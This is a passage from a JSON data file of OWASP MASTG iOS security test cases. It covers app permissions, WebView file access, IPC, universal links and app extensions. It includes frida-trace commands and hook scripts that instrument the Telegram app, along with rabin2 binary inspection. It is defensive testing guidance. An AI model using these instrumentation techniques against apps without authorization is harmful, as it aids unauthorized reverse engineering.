+[CLLocationManager authorizationStatus] returned 0x4 (<a href=\"https://developer.apple.com/documentation/corelocation/clauthorizationstatus/authorizedwheninuse\" rel=\"noopener noreferrer\" target=\"_blank\">CLAuthorizationStatus.authorizedWhenInUse ↗</a>) and was called by +[TGLocationUtils requestWhenInUserLocationAuthorizationWithLocationManager:]. As we anticipated before, you might use this kind of information as an entry point when reverse engineering the app and from there get inputs (e.g. names of classes or methods) to keep feeding the dynamic analysis.</p><p>Next, there is a <em>visual</em> way to inspect the status of some app permissions when using the iPhone/iPad by opening \"Settings\" and scrolling down until you find the app you're interested in. When clicking on it, this will open the \"ALLOW APP_NAME TO ACCESS\" screen. However, not all permissions might be displayed yet. You will have to trigger them in order to be listed on that screen.</p><p>For example, in the previous example, the \"Location\" entry was not being listed until we triggered the permission dialogue for the first time. Once we did it, no matter if we allowed the access or not, the the \"Location\" entry will be displayed.</p>",
        "code": "MASTG-TEST-0069",
        "sort_order": 76
    },
    {
        "tags":
        [
            "MASTG-TEST-0253: Runtime Use of Local File Access APIs in WebViews"
        ],
        "testcase": "Runtime Use of Local File Access APIs in WebViews",
        "details": "<h2>Overview</h2><p>This test is the dynamic counterpart to <em><a href=\"https://mas.owasp.org/MASTG-TEST-0252\" rel=\"noopener noreferrer\" target=\"_blank\"> References to Local File Access in WebViews</a></em>.</p><h2></h2><h2>Steps</h2><ol><li>Run a dynamic analysis tool like <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0039\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida for iOS</a></em> and either:<ul><li>enumerate instances of WebView in the app and list their configuration values</li><li>or explicitly hook the setters of the WebView settings</li></ul></li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of WebView instances and corresponding settings.</p><h2></h2><h2>Evaluation</h2><p><strong>Fail:</strong></p><p>The test fails if all of the following are true:</p><ul><li>AllowFileAccess is true.</li><li>AllowFileAccessFromFileURLs is true.</li><li>AllowUniversalAccessFromFileURLs is true.</li></ul><p><strong>Note:</strong> AllowFileAccess being true does not represent a security vulnerability by itself, but it can be used in combination with other vulnerabilities to escalate the impact of an attack. Therefore, it is recommended to explicitly set it to false if the app does not need to access local files.</p><p><strong>Pass:</strong></p><p>The test passes if any of the following are true:</p><ul><li>AllowFileAccess is false.</li><li>AllowFileAccessFromFileURLs is false.</li><li>AllowUniversalAccessFromFileURLs is false.</li></ul><h2></h2><h2>Mitigations</h2><ul><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0010\" rel=\"noopener noreferrer\" target=\"_blank\"> Use Up-to-Date minSdkVersion</a></em></li><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0011\" rel=\"noopener noreferrer\" target=\"_blank\"> Securely Load File Content in a WebView</a></em></li><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0012\" rel=\"noopener noreferrer\" target=\"_blank\"> Disable JavaScript in WebViews</a></em></li></ul>",
        "code": "MASTG-TEST-0253",
        "sort_order": 71
    },
    {
        "tags":
        [
            "MASTG-TEST-0056: Determining Whether Sensitive Data Is Exposed via IPC Mechanisms"
        ],
        "testcase": "Determining Whether Sensitive Data Is Exposed via IPC Mechanisms",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>The following section summarizes keywords that you should look for to identify IPC implementations within iOS source code.</p><h3>XPC Services</h3><p>Several classes may be used to implement the NSXPCConnection API:</p><ul><li>NSXPCConnection</li><li>NSXPCInterface</li><li>NSXPCListener</li><li>NSXPCListenerEndpoint</li></ul><p>You can set <a href=\"https://www.objc.io/issues/14-mac/xpc/#security-attributes-of-the-connection\" rel=\"noopener noreferrer\" target=\"_blank\">security attributes ↗</a> for the connection. The attributes should be verified.</p><p>Check for the following two files in the Xcode project for the XPC Services API (which is C-based):</p><ul><li><a href=\"https://developer.apple.com/documentation/xpc/xpc_services_xpc.h\" rel=\"noopener noreferrer\" target=\"_blank\">xpc.h ↗</a></li><li>connection.h</li></ul><h3>Mach Ports</h3><p>Keywords to look for in low-level implementations:</p><ul><li>mach_port_t</li><li>mach_msg_*</li></ul><p>Keywords to look for in high-level implementations (Core Foundation and Foundation wrappers):</p><ul><li>CFMachPort</li><li>CFMessagePort</li><li>NSMachPort</li><li>NSMessagePort</li></ul><h3>NSFileCoordinator</h3><p>Keywords to look for:</p><ul><li>NSFileCoordinator</li></ul><h2></h2><h2>Dynamic Analysis</h2><p>Verify IPC mechanisms with static analysis of the iOS source code. No iOS tool is currently available to verify IPC usage.</p>",
        "code": "MASTG-TEST-0056",
        "sort_order": 73
    },
    {
        "tags":
        [
            "MASTG-TEST-0070: Testing Universal Links"
        ],
        "testcase": "Testing Universal Links",
        "details": "<h2>Overview</h2><h2></h2><h2>Static Analysis</h2><p>Testing universal links on a static approach includes doing the following:</p><ul><li>Checking the Associated Domains entitlement</li><li>Retrieving the Apple App Site Association file</li><li>Checking the link receiver method</li><li>Checking the data handler method</li><li>Checking if the app is calling other app's universal links</li></ul><h3>Checking the Associated Domains Entitlement</h3><p>Universal links require the developer to add the Associated Domains entitlement and include in it a list of the domains that the app supports.</p><p>In Xcode, go to the <strong>Capabilities</strong> tab and search for <strong>Associated Domains</strong>. You can also inspect the .entitlements file looking for com.apple.developer.associated-domains. Each of the domains must be prefixed with applinks:, such as applinks:www.mywebsite.com.</p><p>Here's an example from Telegram's .entitlements file:</p><pre>    &lt;key&gt;com.apple.developer.associated-domains&lt;/key&gt;\n    &lt;array&gt;\n        &lt;string&gt;applinks:telegram.me&lt;/string&gt;\n        &lt;string&gt;applinks:t.me&lt;/string&gt;\n    &lt;/array&gt;\n</pre><p>More detailed information can be found in the <a href=\"https://developer.apple.com/library/archive/documentation/General/Conceptual/AppSearch/UniversalLinks.html#//apple_ref/doc/uid/TP40016308-CH12-SW2\" rel=\"noopener noreferrer\" target=\"_blank\">archived Apple Developer Documentation ↗</a>.</p><p>If you don't have the original source code you can extract them from the MachO file as explained in <em><a href=\"https://mas.owasp.org/MASTG-TECH-0111\" rel=\"noopener noreferrer\" target=\"_blank\"> Extracting Entitlements from MachO Binaries</a></em>.</p><h3>Retrieving the Apple App Site Association File</h3><p>Try to retrieve the apple-app-site-association file from the server using the associated domains you got from the previous step. This file needs to be accessible via HTTPS, without any redirects, at https://&lt;domain&gt;/apple-app-site-association or https://&lt;domain&gt;/.well-known/apple-app-site-association.</p><p>You can retrieve it yourself using your browser and navigating to https://&lt;domain&gt;/apple-app-site-association, https://&lt;domain&gt;/.well-known/apple-app-site-association or using Apple's CDN at https://app-site-association.cdn-apple.com/a/v1/&lt;domain&gt;.</p><p>Alternatively, you can use the <a href=\"https://branch.io/resources/aasa-validator/\" rel=\"noopener noreferrer\" target=\"_blank\">Apple App Site Association (AASA) Validator ↗</a>. After entering the domain, it will display the file, verify it for you and show the results (e.g. if it is not being properly served over HTTPS). See the following example from apple.com https://www.apple.com/.well-known/apple-app-site-association:</p><pre>{\n    \"activitycontinuation\": {\n    \"apps\": [\n        \"W74U47NE8E.com.apple.store.Jolly\"\n    ]\n    },\n    \"applinks\": {\n        \"apps\": [],\n        \"details\": [\n            {\n            \"appID\": \"W74U47NE8E.com.apple.store.Jolly\",\n            \"paths\": [\n                \"NOT /shop/buy-iphone/*\",\n                \"NOT /us/shop/buy-iphone/*\",\n                \"/xc/*\",\n                \"/shop/buy-*\",\n                \"/shop/product/*\",\n                \"/shop/bag/shared_bag/*\",\n                \"/shop/order/list\",\n                \"/today\",\n                \"/shop/watch/watch-accessories\",\n                \"/shop/watch/watch-accessories/*\",\n                \"/shop/watch/bands\",\n            ] } ] }\n}\n</pre><p>The \"details\" key inside \"applinks\" contains a JSON representation of an array that might contain one or more apps. The \"appID\" should match the \"application-identifier\" key from the app's entitlements. Next, using the \"paths\" key, the developers can specify certain paths to be handled on a per app basis. Some apps, like Telegram use a standalone * (\"paths\": [\"*\"]) in order to allow all possible paths. Only if specific areas of the website should <strong>not</strong> be handled by some app, the developer can restrict access by excluding them by prepending a \"NOT \" (note the whitespace after the T) to the corresponding path. Also remember that the system will look for matches by following the order of the dictionaries in the array (first match wins).</p><p>This path exclusion mechanism is not to be seen as a security feature but rather as a filter that developer might use to specify which apps open which links. By default, iOS does not open any unverified links.</p><p>Remember that universal links verification occurs at installation time. iOS retrieves the AASA file for the declared domains (applinks) in its com.apple.developer.associated-domains entitlement. iOS will refuse to open those links if the verification did not succeed. Some reasons to fail verification might include:</p><ul><li>The AASA file is not served over HTTPS.</li><li>The AASA is not available.</li><li>The appIDs do not match (this would be the case of a <em>malicious</em> app). iOS would successfully prevent any possible hijacking attacks.</li></ul><h3>Checking the Link Receiver Method</h3><p>In order to receive links and handle them appropriately, the app delegate has to implement <a href=\"https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623072-application\" rel=\"noopener noreferrer\" target=\"_blank\">application:continueUserActivity:restorationHandler: ↗</a>. If you have the original project try searching for this method.</p><p>Please note that if the app uses <a href=\"https://developer.apple.com/documentation/uikit/uiapplication/1648685-openurl?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">openURL:options:completionHandler: ↗</a> to open a universal link to the app's website, the link won't open in the app. As the call originates from the app, it won't be handled as a universal link.</p><p>From Apple Docs: When iOS launches your app after a user taps a universal link, you receive an NSUserActivity object with an activityType value of NSUserActivityTypeBrowsingWeb. The activity object's webpageURL property contains the URL that the user is accessing. The webpage URL property always contains an HTTP or HTTPS URL, and you can use NSURLComponents APIs to manipulate the components of the URL. [...] To protect users' privacy and security, you should not use HTTP when you need to transport data; instead, use a secure transport protocol such as HTTPS.</p><p>From the note above we can highlight that:</p><ul><li>The mentioned NSUserActivity object comes from the continueUserActivity parameter, as seen in the method above.</li><li>The scheme of the webpageURL must be HTTP or HTTPS (any other scheme should throw an exception). The <a href=\"https://developer.apple.com/documentation/foundation/urlcomponents/1779624-scheme\" rel=\"noopener noreferrer\" target=\"_blank\">scheme instance property ↗</a> of URLComponents / NSURLComponents can be used to verify this.</li></ul><p>If you don't have the original source code you can use <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> or <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0129\" rel=\"noopener noreferrer\" target=\"_blank\"> rabin2</a></em> to search the binary strings for the link receiver method:</p><pre>$ rabin2 -zq Telegram\\ X.app/Telegram\\ X | grep restorationHan\n\n0x1000deea9 53 52 application:continueUserActivity:restorationHandler:\n</pre><h3>Checking the Data Handler Method</h3><p>You should check how the received data is validated. Apple <a href=\"https://developer.apple.com/documentation/uikit/core_app/allowing_apps_and_websites_to_link_to_your_content/handling_universal_links\" rel=\"noopener noreferrer\" target=\"_blank\">explicitly warns about this ↗</a>:</p><p>Universal links offer a potential attack vector into your app, so make sure to validate all URL parameters and discard any malformed URLs. In addition, limit the available actions to those that do not risk the user's data. For example, do not allow universal links to directly delete content or access sensitive information about the user. When testing your URL-handling code, make sure your test cases include improperly formatted URLs.</p><p>As stated in the <a href=\"https://developer.apple.com/documentation/uikit/core_app/allowing_apps_and_websites_to_link_to_your_content/handling_universal_links\" rel=\"noopener noreferrer\" target=\"_blank\">Apple Developer Documentation ↗</a>, when iOS opens an app as the result of a universal link, the app receives an NSUserActivity object with an activityType value of NSUserActivityTypeBrowsingWeb. The activity object's webpageURL property contains the HTTP or HTTPS URL that the user accesses. The following example in Swift verifies exactly this before opening the URL:</p><pre>func application(_ application: UIApplication, continue userActivity: NSUserActivity,\n                 restorationHandler: @escaping ([UIUserActivityRestoring]?) -&gt; Void) -&gt; Bool {\n    // ...\n    if userActivity.activityType == NSUserActivityTypeBrowsingWeb, let url = userActivity.webpageURL {\n        application.open(url, options: [:], completionHandler: nil)\n    }\n\n    return true\n}\n</pre><p>In addition, remember that if the URL includes parameters, they should not be trusted before being carefully sanitized and validated (even when coming from trusted domain). For example, they might have been spoofed by an attacker or might include malformed data. If that is the case, the whole URL and therefore the universal link request must be discarded.</p><p>The NSURLComponents API can be used to parse and manipulate the components of the URL. This can be also part of the method application:continueUserActivity:restorationHandler: itself or might occur on a separate method being called from it. The following <a href=\"https://developer.apple.com/documentation/uikit/core_app/allowing_apps_and_websites_to_link_to_your_content/handling_universal_links#3001935\" rel=\"noopener noreferrer\" target=\"_blank\">example ↗</a> demonstrates this:</p><pre>func application(_ application: UIApplication,\n                 continue userActivity: NSUserActivity,\n                 restorationHandler: @escaping ([Any]?) -&gt; Void) -&gt; Bool {\n    guard userActivity.activityType == NSUserActivityTypeBrowsingWeb,\n        let incomingURL = userActivity.webpageURL,\n        let components = NSURLComponents(url: incomingURL, resolvingAgainstBaseURL: true),\n        let path = components.path,\n        let params = components.queryItems else {\n        return false\n    }\n\n    if let albumName = params.first(where: { $0.name == \"albumname\" })?.value,\n        let photoIndex = params.first(where: { $0.name == \"index\" })?.value {\n        // Interact with album name and photo index\n\n        return true\n\n    } else {\n        // Handle when album and/or album name or photo index missing\n\n        return false\n    }\n}\n</pre><p>Finally, as stated above, be sure to verify that the actions triggered by the URL do not expose sensitive information or risk the user's data on any way.</p><h3>Checking if the App is Calling Other App's Universal Links</h3><p>An app might be calling other apps via universal links in order to simply trigger some actions or to transfer information, in that case, it should be verified that it is not leaking sensitive information.</p><p>If you have the original source code, you can search it for the openURL:options: completionHandler: method and check the data being handled.</p><p>Note that the openURL:options:completionHandler: method is not only used to open universal links but also to call custom URL schemes.</p><p>This is an example from the Telegram app:</p><pre>}, openUniversalUrl: { url, completion in\n    if #available(iOS 10.0, *) {\n        var parsedUrl = URL(string: url)\n        if let parsed = parsedUrl {\n            if parsed.scheme == nil || parsed.scheme!.isEmpty {\n                parsedUrl = URL(string: \"https://\\(url)\")\n            }\n        }\n\n        if let parsedUrl = parsedUrl {\n            return UIApplication.shared.open(parsedUrl,\n                        options: [UIApplicationOpenURLOptionUniversalLinksOnly: true as NSNumber],\n                        completionHandler: { value in completion.completion(value)}\n            )\n</pre><p>Note how the app adapts the scheme to \"https\" before opening it and how it uses the option UIApplicationOpenURLOptionUniversalLinksOnly: true that <a href=\"https://developer.apple.com/documentation/uikit/uiapplicationopenurloptionuniversallinksonly?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">opens the URL only if the URL is a valid universal link and there is an installed app capable of opening that URL ↗</a>.</p><p>If you don't have the original source code, search in the symbols and in the strings of the app binary. For example, we will search for Objective-C methods that contain \"openURL\":</p><pre>$ rabin2 -zq Telegram\\ X.app/Telegram\\ X | grep openURL\n\n0x1000dee3f 50 49 application:openURL:sourceApplication:annotation:\n0x1000dee71 29 28 application:openURL:options:\n0x1000df2c9 9 8 openURL:\n0x1000df772 35 34 openURL:options:completionHandler:\n</pre><p>As expected, openURL:options:completionHandler: is among the ones found (remember that it might be also present because the app opens custom URL schemes). Next, to ensure that no sensitive information is being leaked you'll have to perform dynamic analysis and inspect the data being transmitted. Please refer to <em><a href=\"https://mas.owasp.org/MASTG-TEST-0075\" rel=\"noopener noreferrer\" target=\"_blank\"> Testing Custom URL Schemes</a></em> for some examples on hooking and tracing this method.</p><h2></h2><h2>Dynamic Analysis</h2><p>If an app is implementing universal links, you should have the following outputs from the static analysis:</p><ul><li>the associated domains</li><li>the Apple App Site Association file</li><li>the link receiver method</li><li>the data handler method</li></ul><p>You can use this now to dynamically test them:</p><ul><li>Triggering universal links</li><li>Identifying valid universal links</li><li>Tracing the link receiver method</li><li>Checking how the links are opened</li></ul><h3>Triggering Universal Links</h3><p>Unlike custom URL schemes, unfortunately you cannot test universal links from Safari just by typing them in the search bar directly as this is not allowed by Apple. But you can test them anytime using other apps like the Notes app:</p><ul><li>Open the Notes app and create a new note.</li><li>Write the links including the domain.</li><li>Leave the editing mode in the Notes app.</li><li>Long press the links to open them (remember that a standard click triggers the default option).</li></ul><p>To do it from Safari you will have to find an existing link on a website that once clicked, it will be recognized as a Universal Link. This can be a bit time consuming.</p><p>Alternatively you can also use Frida for this, see <em><a href=\"https://mas.owasp.org/MASTG-TEST-0075\" rel=\"noopener noreferrer\" target=\"_blank\"> Testing Custom URL Schemes</a></em> for more details.</p><h3>Identifying Valid Universal Links</h3><p>First of all we will see the difference between opening an allowed Universal Link and one that shouldn't be allowed.</p><p>From the apple-app-site-association of apple.com we have seen above we chose the following paths:</p><pre>\"paths\": [\n    \"NOT /shop/buy-iphone/*\",\n    ...\n    \"/today\",\n</pre><p>One of them should offer the \"Open in app\" option and the other should not.</p><p>If we long press on the first one (http://www.apple.com/shop/buy-iphone/iphone-xr) it only offers the option to open it (in the browser).</p><p>If we long press on the second (http://www.apple.com/today) it shows options to open it in Safari and in \"Apple Store\":</p><p>Note that there is a difference between a click and a long press. Once we long press a link and select an option, e.g. \"Open in Safari\", this will become the default option for all future clicks until we long press again and select another option.</p><p>If we repeat the process on the method application:continueUserActivity: restorationHandler: by either hooking or tracing, we will see how it gets called as soon as we open the allowed universal link. For this you can use for example frida-trace:</p><pre>frida-trace -U \"Apple Store\" -m \"*[* *restorationHandler*]\"\n</pre><h3>Tracing the Link Receiver Method</h3><p>This section explains how to trace the link receiver method and how to extract additional information. For this example, we will use Telegram, as there are no restrictions in its apple-app-site-association file:</p><pre>{\n    \"applinks\": {\n        \"apps\": [],\n        \"details\": [\n            {\n                \"appID\": \"X834Q8SBVP.org.telegram.TelegramEnterprise\",\n                \"paths\": [\n                    \"*\"\n                ]\n            },\n            {\n                \"appID\": \"C67CF9S4VU.ph.telegra.Telegraph\",\n                \"paths\": [\n                    \"*\"\n                ]\n            },\n            {\n                \"appID\": \"X834Q8SBVP.org.telegram.Telegram-iOS\",\n                \"paths\": [\n                    \"*\"\n                ]\n            }\n        ]\n    }\n}\n</pre><p>In order to open the links we will also use the Notes app and frida-trace with the following pattern:</p><pre>frida-trace -U Telegram -m \"*[* *restorationHandler*]\"\n</pre><p>Write https://t.me/addstickers/radare (found through a quick Internet research) and open it from the Notes app.</p><p>First we let frida-trace generate the stubs in __handlers__/:</p><pre>$ frida-trace -U Telegram -m \"*[* *restorationHandler*]\"\nInstrumenting functions...\n-[AppDelegate application:continueUserActivity:restorationHandler:]\n</pre><p>You can see that only one function was found and is being instrumented. Trigger now the universal link and observe the traces.</p><pre>298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780\n                restorationHandler:0x16f27a898]\n</pre><p>You can observe that the function is in fact being called. You can now add code to the stubs in __handlers__/ to obtain more details:</p><pre>// __handlers__/__AppDelegate_application_contin_8e36bbb1.js\n\n  onEnter: function (log, args, state) {\n    log(\"-[AppDelegate application: \" + args[2] + \" continueUserActivity: \" + args[3] +\n                     \" restorationHandler: \" + args[4] + \"]\");\n    log(\"\\tapplication: \" + ObjC.Object(args[2]).toString());\n    log(\"\\tcontinueUserActivity: \" + ObjC.Object(args[3]).toString());\n    log(\"\\t\\twebpageURL: \" + ObjC.Object(args[3]).webpageURL().toString());\n    log(\"\\t\\tactivityType: \" + ObjC.Object(args[3]).activityType().toString());\n    log(\"\\t\\tuserInfo: \" + ObjC.Object(args[3]).userInfo().toString());\n    log(\"\\trestorationHandler: \" +ObjC.Object(args[4]).toString());\n  },\n</pre><p>The new output is:</p><pre>298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780\n                restorationHandler:0x16f27a898]\n298382 ms  application:&lt;Application: 0x10556b3c0&gt;\n298382 ms  continueUserActivity:&lt;NSUserActivity: 0x1c4237780&gt;\n298382 ms       webpageURL:http://t.me/addstickers/radare\n298382 ms       activityType:NSUserActivityTypeBrowsingWeb\n298382 ms       userInfo:{\n}\n298382 ms  restorationHandler:&lt;__NSStackBlock__: 0x16f27a898&gt;\n</pre><p>Apart from the function parameters we have added more information by calling some methods from them to get more details, in this case about the NSUserActivity. If we look in the <a href=\"https://developer.apple.com/documentation/foundation/nsuseractivity?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">Apple Developer Documentation ↗</a> we can see what else we can call from this object.</p><h3>Checking How the Links Are Opened</h3><p>If you want to know more about which function actually opens the URL and how the data is actually being handled you should keep investigating.</p><p>Extend the previous command in order to find out if there are any other functions involved into opening the URL.</p><pre>frida-trace -U Telegram -m \"*[* *restorationHandler*]\" -i \"*open*Url*\"\n</pre><p>-i includes any method. You can also use a glob pattern here (e.g. -i \"*open*Url*\" means \"include any function containing 'open', then 'Url' and something else\")</p><p>Again, we first let frida-trace generate the stubs in __handlers__/:</p><pre>$ frida-trace -U Telegram -m \"*[* *restorationHandler*]\" -i \"*open*Url*\"\nInstrumenting functions...\n-[AppDelegate application:continueUserActivity:restorationHandler:]\n$S10TelegramUI0A19ApplicationBindingsC16openUniversalUrlyySS_AA0ac4OpenG10Completion...\n$S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData18application...\n$S10TelegramUI31AuthorizationSequenceControllerC7account7strings7openUrl5apiId0J4HashAC0A4Core19...\n...\n</pre><p>Now you can see a long list of functions but we still don't know which ones will be called. Trigger the universal link again and observe the traces.</p><pre>           /* TID 0x303 */\n298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780\n                restorationHandler:0x16f27a898]\n298619 ms     | $S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData\n                18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA\n                14OpenURLContextOSSSbAA012PresentationK0CAA0a11ApplicationM0C7Display0\n                10NavigationO0CSgyyctF()\n</pre><p>Apart from the Objective-C method, now there is one Swift function that is also of your interest.</p><p>There is probably no documentation for that Swift function but you can just demangle its symbol using swift-demangle via <a href=\"http://www.manpagez.com/man/1/xcrun/\" rel=\"noopener noreferrer\" target=\"_blank\">xcrun ↗</a>:</p><p>xcrun can be used invoke Xcode developer tools from the command-line, without having them in the path. In this case it will locate and run swift-demangle, an Xcode tool that demangles Swift symbols.</p><pre>$ xcrun swift-demangle S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData\n18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA14OpenURLContextOSSSbAA0\n12PresentationK0CAA0a11ApplicationM0C7Display010NavigationO0CSgyyctF\n</pre><p>Resulting in:</p><pre>---&gt; TelegramUI.openExternalUrl(\n    account: TelegramCore.Account, context: TelegramUI.OpenURLContext, url: Swift.String,\n    forceExternal: Swift.Bool, presentationData: TelegramUI.PresentationData,\n    applicationContext: TelegramUI.TelegramApplicationContext,\n    navigationController: Display.NavigationController?, dismissInput: () -&gt; ()) -&gt; ()\n</pre><p>This not only gives you the class (or module) of the method, its name and the parameters but also reveals the parameter types and return type, so in case you need to dive deeper now you know where to start.</p><p>For now we will use this information to properly print the parameters by editing the stub file:</p><pre>// __handlers__/TelegramUI/_S10TelegramUI15openExternalUrl7_b1a3234e.js\n\n  onEnter: function (log, args, state) {\n\n    log(\"TelegramUI.openExternalUrl(account: TelegramCore.Account,\n        context: TelegramUI.OpenURLContext, url: Swift.String, forceExternal: Swift.Bool,\n        presentationData: TelegramUI.PresentationData,\n        applicationContext: TelegramUI.TelegramApplicationContext,\n        navigationController: Display.NavigationController?, dismissInput: () -&gt; ()) -&gt; ()\");\n    log(\"\\taccount: \" + ObjC.Object(args[0]).toString());\n    log(\"\\tcontext: \" + ObjC.Object(args[1]).toString());\n    log(\"\\turl: \" + ObjC.Object(args[2]).toString());\n    log(\"\\tpresentationData: \" + args[3]);\n    log(\"\\tapplicationContext: \" + ObjC.Object(args[4]).toString());\n    log(\"\\tnavigationController: \" + ObjC.Object(args[5]).toString());\n  },\n</pre><p>This way, the next time we run it we get a much more detailed output:</p><pre>298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780\n                restorationHandler:0x16f27a898]\n298382 ms  application:&lt;Application: 0x10556b3c0&gt;\n298382 ms  continueUserActivity:&lt;NSUserActivity: 0x1c4237780&gt;\n298382 ms       webpageURL:http://t.me/addstickers/radare\n298382 ms       activityType:NSUserActivityTypeBrowsingWeb\n298382 ms       userInfo:{\n}\n298382 ms  restorationHandler:&lt;__NSStackBlock__: 0x16f27a898&gt;\n\n298619 ms     | TelegramUI.openExternalUrl(account: TelegramCore.Account,\ncontext: TelegramUI.OpenURLContext, url: Swift.String, forceExternal: Swift.Bool,\npresentationData: TelegramUI.PresentationData, applicationContext:\nTelegramUI.TelegramApplicationContext, navigationController: Display.NavigationController?,\ndismissInput: () -&gt; ()) -&gt; ()\n298619 ms     |     account: TelegramCore.Account\n298619 ms     |     context: nil\n298619 ms     |     url: http://t.me/addstickers/radare\n298619 ms     |     presentationData: 0x1c4e40fd1\n298619 ms     |     applicationContext: nil\n298619 ms     |     navigationController: TelegramUI.PresentationData\n</pre><p>There you can observe the following:</p><ul><li>It calls application:continueUserActivity:restorationHandler: from the app delegate as expected.</li><li>application:continueUserActivity:restorationHandler: handles the URL but does not open it, it calls TelegramUI.openExternalUrl for that.</li><li>The URL being opened is https://t.me/addstickers/radare.</li></ul><p>You can now keep going and try to trace and verify how the data is being validated. For example, if you have two apps that <em>communicate</em> via universal links you can use this to see if the sending app is leaking sensitive data by hooking these methods in the receiving app. This is especially useful when you don't have the source code as you will be able to retrieve the full URL that you wouldn't see other way as it might be the result of clicking some button or triggering some functionality.</p><p>In some cases, you might find data in userInfo of the NSUserActivity object. In the previous case there was no data being transferred but it might be the case for other scenarios. To see this, be sure to hook the userInfo property or access it directly from the continueUserActivity object in your hook (e.g. by adding a line like this log(\"userInfo:\" + ObjC.Object(args[3]).userInfo().toString());).</p><h3>Final Notes about Universal Links and Handoff</h3><p>Universal links and Apple's <a href=\"https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Handoff/HandoffFundamentals/HandoffFundamentals.html#//apple_ref/doc/uid/TP40014338\" rel=\"noopener noreferrer\" target=\"_blank\">Handoff feature ↗</a> are related:</p><ul><li>Both rely on the same method when receiving data:</li></ul><pre>application:continueUserActivity:restorationHandler:\n</pre><ul><li>Like universal links, the Handoff's Activity Continuation must be declared in the com.apple.developer.associated-domains entitlement and in the server's apple-app-site-association file (in both cases via the keyword \"activitycontinuation\":). See \"Retrieving the Apple App Site Association File\" above for an example.</li></ul><p>Actually, the previous example in \"Checking How the Links Are Opened\" is very similar to the \"Web Browser-to-Native App Handoff\" scenario described in the <a href=\"https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Handoff/AdoptingHandoff/AdoptingHandoff.html#//apple_ref/doc/uid/TP40014338-CH2-SW10\" rel=\"noopener noreferrer\" target=\"_blank\">\"Handoff Programming Guide\" ↗</a>:</p><p>If the user is using a web browser on the originating device, and the receiving device is an iOS device with a native app that claims the domain portion of the webpageURL property, then iOS launches the native app and sends it an NSUserActivity object with an activityType value of NSUserActivityTypeBrowsingWeb. The webpageURL property contains the URL the user was visiting, while the userInfo dictionary is empty.</p><p>In the detailed output above you can see that NSUserActivity object we've received meets exactly the mentioned points:</p><pre>298382 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c4237780\n                restorationHandler:0x16f27a898]\n298382 ms  application:&lt;Application: 0x10556b3c0&gt;\n298382 ms  continueUserActivity:&lt;NSUserActivity: 0x1c4237780&gt;\n298382 ms       webpageURL:http://t.me/addstickers/radare\n298382 ms       activityType:NSUserActivityTypeBrowsingWeb\n298382 ms       userInfo:{\n}\n298382 ms  restorationHandler:&lt;__NSStackBlock__: 0x16f27a898&gt;\n</pre><p>This knowledge should help you when testing apps supporting Handoff.</p>",
        "code": "MASTG-TEST-0070",
        "sort_order": 77
    },
    {
        "tags":
        [
            "MASTG-TEST-0072: Testing App Extensions"
        ],
        "testcase": "Testing App Extensions",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>The static analysis will take care of:</p><ul><li>Verifying if the app contains app extensions</li><li>Determining the supported data types</li><li>Checking data sharing with the containing app</li><li>Verifying if the app restricts the use of app extensions</li></ul><h3>Verifying if the App Contains App Extensions</h3><p>If you have the original source code you can search for all occurrences of NSExtensionPointIdentifier with Xcode (cmd+shift+f) or take a look into \"Build Phases / Embed App extensions\":</p><p>There you can find the names of all embedded app extensions followed by .appex, now you can navigate to the individual app extensions in the project.</p><p>If not having the original source code:</p><p>Grep for NSExtensionPointIdentifier among all files inside the app bundle (IPA or installed app):</p><pre>$ grep -nr NSExtensionPointIdentifier Payload/Telegram\\ X.app/\nBinary file Payload/Telegram X.app//PlugIns/SiriIntents.appex/Info.plist matches\nBinary file Payload/Telegram X.app//PlugIns/Share.appex/Info.plist matches\nBinary file Payload/Telegram X.app//PlugIns/NotificationContent.appex/Info.plist matches\nBinary file Payload/Telegram X.app//PlugIns/Widget.appex/Info.plist matches\nBinary file Payload/Telegram X.app//Watch/Watch.app/PlugIns/Watch Extension.appex/Info.plist matches\n</pre><p>You can also access per SSH, find the app bundle and list all inside PlugIns (they are placed there by default) or do it with objection:</p><pre>ph.telegra.Telegraph on (iPhone: 11.1.2) [usb] # cd PlugIns\n    /var/containers/Bundle/Application/15E6A58F-1CA7-44A4-A9E0-6CA85B65FA35/\n    Telegram X.app/PlugIns\n\nph.telegra.Telegraph on (iPhone: 11.1.2) [usb] # ls\nNSFileType      Perms  NSFileProtection    Read    Write     Name\n------------  -------  ------------------  ------  -------   -------------------------\nDirectory         493  None                True    False     NotificationContent.appex\nDirectory         493  None                True    False     Widget.appex\nDirectory         493  None                True    False     Share.appex\nDirectory         493  None                True    False     SiriIntents.appex\n</pre><p>We can see now the same four app extensions that we saw in Xcode before.</p><h3>Determining the Supported Data Types</h3><p>This is important for data being shared with host apps (e.g. via Share or Action Extensions). When the user selects some data type in a host app and it matches the data types define here, the host app will offer the extension. It is worth noticing the difference between this and data sharing via UIActivity where we had to define the document types, also using UTIs. An app does not need to have an extension for that. It is possible to share data using only UIActivity.</p><p>Inspect the app extension's Info.plist file and search for NSExtensionActivationRule. That key specifies the data being supported as well as e.g. maximum of items 